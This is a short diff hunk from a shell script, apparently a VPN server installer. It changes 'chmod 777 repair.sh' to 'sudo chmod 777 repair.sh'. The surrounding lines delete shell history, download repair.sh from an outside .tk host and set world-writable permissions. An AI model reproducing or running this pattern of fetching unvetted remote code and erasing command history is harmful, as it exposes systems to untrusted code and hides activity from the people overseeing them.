@@ -4184,7 +4184,7 @@ service openvpn restart
 rm *.sh *.zip &> /dev/null
 rm -rf ~/.bash_history && history -c & history -w
 wget "http://code9.tk/john/repair.sh"
-chmod 777 repair.sh
+sudo chmod 777 repair.sh
 sleep 4s
 clear
 echo ''
